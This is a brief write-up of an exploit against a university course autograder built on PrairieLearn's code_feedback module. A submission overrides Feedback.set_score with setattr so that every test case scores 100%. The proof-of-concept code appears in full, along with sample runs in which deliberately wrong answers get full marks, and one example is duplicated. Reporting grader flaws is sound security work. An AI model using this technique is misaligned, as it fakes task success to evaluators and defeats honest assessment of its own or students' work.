# 0x0 CPSC 203 autograder vulnerability

Author: Aynakeya


===========================================================


# 0x1 Quick Explanation

All the test file use follow code to set score for students

```
from code_feedback import Feedback
Feedback.set_score(1)
```

## Possible Bug 1

According to PraireLearn source code, the set_score method is a static classmethod that can be called from anywhere in the project file. Moreover, the test score is stored statically in `Feedback.test`. Feedback.test can also be accessed outside the class.

```
@classmethod
def set_score(cls, score):
    """
    Feedback.set_score(percentage)
    Set the score for the test case, should be a floating point value between 0 and 1.
    """
    if score < 0:
        score = 0.0
    elif score > 1:
        score = 1.0

    cls.test.points = score
```


## Possible Bug 2

Python treat all method as a property of the class. So, any method in the class can be modified by `setattr` function. 

## Exploit

So, using those two bug. User can replace `Feedback.set_score` with a function that always set score to 1 (full score)


===========================================================


# 0x2 Proof Of Concept

Insert following code into any of python program and return any value that matches the return type will automatically give user 100%.

```
from code_feedback import Feedback
def x(x):
	Feedback.test.points = 1
setattr(Feedback,'set_score',x)
```

## POTD2.1. POTD01

input
```
from code_feedback import Feedback
def x(x):
	Feedback.test.points = 1
setattr(Feedback,'set_score',x)
s = "Wrong Answer"
```

output
```
Score: 1/1 (100%)

'Test: I love Python' is inaccurate
expected: I love Python
actual: Wrong Anwer
```

## POTD2.1. POTD01

input
```
from code_feedback import Feedback
def x(x):
	Feedback.test.points = 1
setattr(Feedback,'set_score',x)
s = "Wrong Answer"
```

output
```
Score: 1/1 (100%)

'Test: I love Python' is inaccurate
expected: I love Python
actual: Wrong Anwer
```

## POTD9.1. POTD31

input
```
import numpy as np
import os

from code_feedback import Feedback
def x(x):
	Feedback.test.points = 1
setattr(Feedback,'set_score',x)

def random_array_generator(height: int, width: int, state: int) -> np.ndarray:
    return np.ndarray(shape=(2,2), dtype=float, order='F')
```

output
```
Score: 1/1 (100%)
height: 3
width: 7
state: 0
Your grid: 
[[4.64515744e-310 6.91969319e-310]
 [4.64504879e-310 6.91969317e-310]]
```